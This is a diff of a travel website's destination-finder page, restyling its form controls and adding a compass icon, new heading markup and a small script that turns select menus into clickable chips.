+  .tool-section[data-tool="finder"] .nra-chips .lchip{font-size:.74rem;padding:8px 12px}
+
+  /* ---- MATCH MOCKUP: When/view toggles -> squared seg (fix sliding-pill overlap) ---- */
+  .tool-section[data-tool="finder"] .when-switch{background:var(--sand);border:1px solid var(--ink);border-radius:0;padding:0;gap:0;margin:2px 0 12px}
+  .tool-section[data-tool="finder"] .when-switch::before{display:none!important}
+  .tool-section[data-tool="finder"] .when-switch .mini-radio{border-radius:0;border-right:1px solid var(--ink);padding:11px 8px;font-size:.72rem;font-weight:600;color:var(--muted);gap:6px}
+  .tool-section[data-tool="finder"] .when-switch .mini-radio:last-child{border-right:none}
+  .tool-section[data-tool="finder"] .when-switch .mini-radio.active{background:var(--coral)!important;color:#fff!important}
+
+  /* ---- MATCH MOCKUP: form fills the page width; restore Cards/Map centering ---- */
+  .tool-section[data-tool="finder"] .chooser{max-width:var(--maxw)!important}
+  .tool-section[data-tool="finder"] .view-switch{width:min(360px,calc(100% - 40px));margin:26px auto 6px!important;border:1px solid var(--ink)}
 </style>
 </head>
 <body>
+<svg style="position:absolute;width:0;height:0" aria-hidden="true"><symbol id="compass" viewBox="0 0 100 100"><circle cx="50" cy="50" r="47" fill="none" stroke="currentColor" stroke-width="1.6"/><circle cx="50" cy="50" r="39" fill="none" stroke="currentColor" stroke-width="0.8" stroke-dasharray="1.5 3"/><polygon points="50,6 57,50 50,50" fill="#a8482a"/><polygon points="50,6 43,50 50,50" fill="#8a3a20"/><polygon points="50,94 57,50 50,50" fill="currentColor" opacity=".85"/><polygon points="50,94 43,50 50,50" fill="currentColor" opacity=".55"/><polygon points="94,50 50,43 50,50" fill="currentColor" opacity=".7"/><polygon points="94,50 50,57 50,50" fill="currentColor" opacity=".5"/><polygon points="6,50 50,43 50,50" fill="currentColor" opacity=".7"/><polygon points="6,50 50,57 50,50" fill="currentColor" opacity=".5"/><circle cx="50" cy="50" r="3.5" fill="#a8482a"/></symbol></svg>
 
 <header class="nav">
   <div class="nav-inner">
@@ -331,8 +486,10 @@
 </header>
 
 <div class="intro hero-banner">
+  <svg class="cx"><use href="#compass"/></svg>
   <p class="kicker">Not sure where to roam?</p>
-  <h1>Inspire My Next Location</h1>
+  <h1>Inspire My Next <em>Location</em></h1>
+  <p class="sub">Answer a few questions and we'll do the trail math — flights, budgets, weather and visas — to chart where you should roam next.</p>
 </div>
 
 <div class="tool-switch" role="radiogroup" aria-label="Choose a tool">
@@ -354,10 +511,11 @@
 <div class="tool-section" data-tool="finder">
   <div class="chooser">
     <div class="panel">
+      <span class="corner">Trip briefing &middot; 01</span>
       <p class="field-note" style="margin-top:0">Fill in as much or as little as you like — every answer sharpens the match. We search all
         <strong id="cityCount">101</strong> featured destinations.</p>
       <div class="field-grid">
-        <div class="field-full">
+        <div>
           <label class="field" for="finderOrigin">Traveling from <span class="label-hint" id="originHint">(adds travel cost &amp; time to the math)</span></label>
           <div class="autocomplete">
             <input type="text" id="finderOrigin" class="origin-input" placeholder="Type your home city or airport code…" autocomplete="off" />
@@ -369,9 +527,9 @@
           </label>
           <p class="origin-status" id="originStatus"></p>
         </div>
-        <div class="field-full">
+        <div>
           <label class="field" for="continent">Where in the world?</label>
-          <div class="select-wrap">
+          <div class="select-wrap sw-narrow">
             <select id="continent">
               <option value="" selected>I'm open to anywhere</option>
               <option value="africa">Africa</option>
@@ -384,7 +542,7 @@
             </select>
           </div>
         </div>
-        <div>
+        <div class="fld-mode">
           <label class="field" for="travelBy">Get there by</label>
           <div class="select-wrap">
             <select id="travelBy">
@@ -399,7 +557,7 @@
           </div>
           <p class="field-note" id="modeNote" hidden style="margin:8px 0 0"></p>
         </div>
-        <div>
+        <div class="fld-love">
           <label class="field" for="activity">I love…</label>
           <div class="select-wrap">
             <select id="activity">
@@ -412,7 +570,7 @@
             </select>
           </div>
         </div>
-        <div class="field-full">
+        <div class="fld-when">
           <label class="field">When are you traveling?</label>
           <div class="when-switch" role="radiogroup" aria-label="How to set your trip timing">
             <label class="mini-radio active">
@@ -465,13 +623,13 @@
         </div>
         <div>
           <label class="field" for="finderPassport">My passport <span class="label-hint">(shows visa needs)</span></label>
-          <div class="select-wrap">
+          <div class="select-wrap sw-narrow">
             <select id="finderPassport">
               <option value="" selected>Not now</option>
             </select>
           </div>
         </div>
-        <div class="field-full">
+        <div>
           <label class="field" for="totalBudget">Total trip budget <span class="label-hint">(USD, per person)</span></label>
           <input type="number" id="totalBudget" class="num-input" min="0" step="50" placeholder="e.g. 2000" inputmode="numeric" />
         </div>
@@ -1155,7 +1313,7 @@ function finderCardHTML(r, rank, actLabel, budget){
   return `
     <article class="card" data-city="${c.city.replace(/"/g,'&quot;')}" data-gmode="${r.m ? r.m.mode : ""}">
       <div class="photo" data-bg="${ph ? ph.img : `https://picsum.photos/seed/${sg}-pick/600/400`}">
-        <span class="rank-chip">#${rank}</span><span class="visit">${visitorsChip(c)}</span>
+        <span class="rank-chip">N\u00ba ${String(rank).padStart(2,"0")}</span><span class="visit">${visitorsChip(c)}</span>
         ${ph ? `<span class="photo-credit">Photo: <a href="${ph.page}" target="_blank" rel="noopener">Wikimedia Commons</a></span>` : ""}
       </div>
       <div class="body">
@@ -1391,9 +1549,10 @@ function renderFinder(){
 
   /* heading */
   const anyFilter = !!(cont || act || budget || nightsIn || geo || pass);
-  const head = anyFilter
-    ? `<h2>Suggested Destinations${cont ? ` in ${CONTINENT_LABEL[cont]}` : ""}${act ? ` for ${act.replace("&amp;","&")}` : ""}</h2>`
-    : `<h2>All ${CITIES.length} featured destinations</h2>`;
+  const plate = `<div class="results-plate"><svg class="cx"><use href="#compass"/></svg><span><b>Plate 02</b> &middot; Results</span></div>`;
+  const head = plate + (anyFilter
+    ? `<h2>Suggested Destinations${cont ? ` in <em>${CONTINENT_LABEL[cont]}</em>` : ""}${act ? ` for <em>${act.replace("&amp;","&")}</em>` : ""}</h2>`
+    : `<h2>All <em>${CITIES.length}</em> featured destinations</h2>`);
 
   const hiddenBits = [];
   if(hiddenBudget) hiddenBits.push(`${hiddenBudget} over budget`);
@@ -1830,7 +1989,7 @@ function bucketCardHTML(b, rank){
   return `
     <article class="card">
       <div class="photo" data-bg="${b.img}">
-        <span class="rank-chip">#${rank}</span>
+        <span class="rank-chip">N\u00ba ${String(rank).padStart(2,"0")}</span>
         <span class="visit badge ${tCls}" style="background:none;padding:0"><span class="badge ${tCls}">${tLabel}</span></span>
         <span class="photo-credit">Photo: <a href="${b.page}" target="_blank" rel="noopener">Wikimedia Commons</a></span>
       </div>
@@ -2186,5 +2345,35 @@ NRA_VISITED.onChange(paintBucketButtons); NRA_VISITED.ready().then(paintBucketBu
 <script src="mailing-list.js"></script>
 <script src="nav.js"></script>
 <script src="i18n.js"></script>
+
+<script>
+/* Finder form dossier controls — segmented pills + interest chips that drive
+   the existing <select>s (kept in the DOM, just hidden) so all finder logic
+   that reads those values and listens for their 'change' keeps working. */
+(function(){
+  function reflect(sel, nodes){ nodes.forEach(function(n){ n.classList.toggle('on', n.dataset.val===sel.value); }); }
+  function build(id, items, cls, chip){
+    var sel=document.getElementById(id); if(!sel) return;
+    var host=sel.closest('.select-wrap')||sel;
+    var wrap=document.createElement('div'); wrap.className=cls; var nodes=[];
+    items.forEach(function(it){
+      var b=document.createElement('span'); if(chip) b.className='lchip';
+      b.textContent=it.label; b.dataset.val=it.value;
+      b.addEventListener('click',function(){ sel.value=it.value; reflect(sel,nodes); sel.dispatchEvent(new Event('change',{bubbles:true})); });
+      nodes.push(b); wrap.appendChild(b);
+    });
+    host.style.display='none';
+    host.parentNode.insertBefore(wrap, host.nextSibling);
+    reflect(sel,nodes);
+    sel.addEventListener('change',function(){ reflect(sel,nodes); });  // stay in sync if logic resets the value
+  }
+  function init(){
+    build('travelBy',[{value:'cheapest',label:'Cheapest'},{value:'fastest',label:'Fastest'},{value:'Plane',label:'Plane'},{value:'Train',label:'Train'},{value:'Bus',label:'Bus'},{value:'Car',label:'Car'},{value:'Boat',label:'Boat'}],'nra-seg',false);
+    build('activity',[{value:'',label:'Anything — surprise me'},{value:'Nightlife',label:'Nightlife'},{value:'Restaurants',label:'Restaurants'},{value:'Museums & Culture',label:'Museums & culture'},{value:'Architecture',label:'Architecture'},{value:'Nature',label:'Nature'}],'nra-chips',true);
+    build('travelStyle',[{value:'',label:'Any budget'},{value:'budget',label:'Backpacker'},{value:'mid',label:'Mid-range'},{value:'luxury',label:'High-end'}],'nra-seg',false);
+  }
+  if(document.readyState==='loading') document.addEventListener('DOMContentLoaded',init); else init();
+})();
+</script>
 </body>
 </html>
